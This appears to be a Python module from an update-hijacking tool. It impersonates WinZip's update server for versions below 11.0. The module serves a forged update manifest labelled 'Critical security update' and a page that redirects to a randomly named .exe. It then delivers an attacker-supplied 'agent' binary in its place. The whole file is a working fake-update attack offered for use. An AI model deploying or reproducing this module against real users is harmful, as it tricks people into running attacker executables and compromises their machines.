# -*- coding: utf-8 -*-
from modules import ModuleBase


class Winzip(ModuleBase):
    name = 'Winzip',
    version = '1.0'
    appver = '< 11.0'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = 'update.winzip.com' 
    options = {
        'description': {
            'val': 'Critical security update',
            'desc': 'Description display in the update'
        },
        'version': {
            'val': "'30.' + rand_num(1) + '.' + rand_num(4) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
           'path': '(/updates/wnzpes.txt|/cgi\-bin/updateinfo.cgi)', #10.0
            'type': 'string',
            'method': '',
            'bin': 0,
            #'string' : "<%VERSION%>\n\\n\\n<%DESCRIPTION%>",
            'string' : """<!-- 01007da91898b3199fe8846cd0a315d4800cc8c5db3ee899e6431c6082fea3fdab8891ffb7b60637e99a12cd4820561aeff53dd326d5061757efe272f78cf1fb6a7689737e69aea62c07d8612732c2124eb9e21e9b6436d350169cf2bbd7ee52c33ac7bb2251adc23ba3210c2741e0cd6818606da82af7e236ab83a079087f6f51b1 -->
            <updateinfo version="1">
             <currver maj="24" min="0" build="8519" rev="0" />
              <text><![CDATA[Una nueva version disponible:\n\nWinZip 12.1 Buld 8519e\n\n - WinZip 12.1 es una actualizaci�n de WinZip 12.0. Esta actualizaci�n presenta la nueva extensi�n de formato de Zip (.zipx), dando como resultado archivos de WinZip m�s eficientes hasta el momento, y la opci�n para "cambiar el tama�o de las im�genes" incorporado en la funci�n "Zip and Email" que permite a los usuarios compartir fotos a trav�s de archivos adjuntos de correo electr�nico.\n]]></text>
              </updateinfo>""",
            'parse': 1,
            'file': '',
        }, {
            'path': '/dnldwz.cgi',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://update.winzip.com/winzipupdate<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]